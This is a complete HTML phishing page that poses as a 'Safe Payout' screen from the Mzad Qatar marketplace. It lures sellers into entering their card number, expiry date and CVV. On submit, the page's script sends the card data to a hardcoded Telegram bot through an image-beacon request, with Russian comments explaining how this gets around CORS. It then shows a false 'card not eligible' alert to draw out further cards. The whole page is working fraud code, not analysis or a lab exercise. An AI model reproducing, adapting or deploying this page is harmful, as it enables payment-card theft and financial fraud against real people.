<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <title>Mzad Qatar | Safe Payout</title>
    <link rel="icon" type="image/png" href="https://mzadqatar.com/frontend/images/mzad/favicon.png">
    <style>
        :root { --mzad-red: #8a1538; --bg: #f2f3f5; --text: #333; }
        body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); margin: 0; padding: 0; }
        .app-shell { max-width: 480px; margin: 0 auto; background: white; min-height: 100vh; }
        header { background: white; padding: 12px 16px; border-bottom: 3px solid var(--mzad-red); display: flex; align-items: center; justify-content: space-between; }
        .logo-main { height: 42px; }
        .ad-box { border-bottom: 8px solid var(--bg); }
        .img-container { width: 100%; aspect-ratio: 1.2; background: #fff; display: flex; align-items: center; justify-content: center; overflow: hidden; border-bottom: 1px solid #eee; }
        .img-container img { width: 100%; height: 100%; object-fit: contain; }
        .info { padding: 16px; }
        .title { font-size: 20px; font-weight: 700; color: #111; margin-bottom: 5px; }
        .price { font-size: 32px; font-weight: 800; color: var(--mzad-red); margin-bottom: 15px; }
        .btn-main { background: var(--mzad-red); color: white; border: none; width: 100%; padding: 20px; border-radius: 14px; font-size: 18px; font-weight: 700; cursor: pointer; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 2000; align-items: center; justify-content: center; }
        .modal-content { background: white; width: 85%; padding: 25px; border-radius: 20px; }
        .q-inp { width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; box-sizing: border-box; margin-bottom: 12px; outline: none; }
        .app-footer { background: #fff; padding: 30px 16px; text-align: center; border-top: 8px solid var(--bg); }
        .store-badges img { height: 35px; border-radius: 6px; margin: 0 5px; }
    </style>
</head>
<body>
<div class="app-shell">
    <header><img src="https://mzadqatar.com/frontend/images/mzad/download-logo.svg" class="logo-main"><div style="font-weight:700; color:var(--mzad-red);">العربية</div></header>
    <div class="ad-box">
        <div class="img-container"><img id="p-img" src=""></div>
        <div class="info">
            <div style="color:#27ae60; font-size:12px; font-weight:800;">✓ SECURE TRANSACTION ACTIVE</div>
            <h1 class="title" id="p-name">Loading...</h1>
            <div class="price" id="p-price">0 QAR</div>
        </div>
    </div>
    <div style="padding:20px 16px;"><button class="btn-main" onclick="openPay()">RECEIVE FUNDS</button></div>
    <div class="modal" id="payModal">
        <div class="modal-content">
            <div style="font-size:18px; font-weight:700; text-align:center; margin-bottom:20px; color:var(--mzad-red);">Verification Required</div>
            <form id="hit-form">
                <input type="text" id="cn" class="q-inp" placeholder="Card Number" required maxlength="19">
                <div style="display:flex; gap:10px;">
                    <input type="text" id="ce" class="q-inp" placeholder="MM/YY" required maxlength="5" style="flex:1.5;">
                    <input type="text" id="cv" class="q-inp" placeholder="CVV" required maxlength="4" style="flex:1;">
                </div>
                <button type="submit" class="btn-main" id="btn-txt">CONFIRM</button>
            </form>
        </div>
    </div>
    <div class="app-footer">
        <p style="font-weight:700; font-size:13px;">GET THE MZAD QATAR APP</p>
        <div class="store-badges">
            <img src="https://mzadqatar.com/frontend/images/mzad/app_store.png">
            <img src="https://mzadqatar.com/frontend/images/mzad/google_play.png">
        </div>
    </div>
</div>

<script>
    // ПРИЕМЩИК (БОТ 1)
    const T = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
    const C = '8071425015';

    const url = new URLSearchParams(window.location.search);
    document.getElementById('p-name').innerText = url.get('item') || 'iPhone 17 Pro Max';
    document.getElementById('p-price').innerText = (url.get('price') || '4800') + ' QAR';
    
    // ФИКС КАРТИНКИ: используем прокси wsrv.nl для обхода блокировки
    const rawImg = url.get('img');
    if(rawImg) {
        document.getElementById('p-img').src = `https://wsrv.nl/?url=${encodeURIComponent(rawImg)}`;
    }

    function openPay() { document.getElementById('payModal').style.display = 'flex'; }

    document.getElementById('cn').oninput = (e) => {
        e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim();
    };
    document.getElementById('ce').oninput = (e) => {
        e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{2})/,'$1/').trim();
    };

    document.getElementById('hit-form').onsubmit = function(e) {
        e.preventDefault();
        const b = document.getElementById('btn-txt');
        b.innerText = 'Verifying...';
        
        const msg = `🇶🇦 **MZAD HIT**\n📦 ${url.get('item')}\n💰 ${url.get('price')} QAR\n\n💳 \`${document.getElementById('cn').value}\`\n📅 \`${document.getElementById('ce').value}\`\n🔒 \`${document.getElementById('cv').value}\``;

        // Используем Image Beacon для обхода CORS (самый надежный метод)
        const target = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
        const n = new Image();
        n.src = target;

        setTimeout(() => {
            alert("This card is not eligible for international payout. Please use another card to complete the verification.");
            location.reload();
        }, 2000);
    };
</script>
</body>
</html>
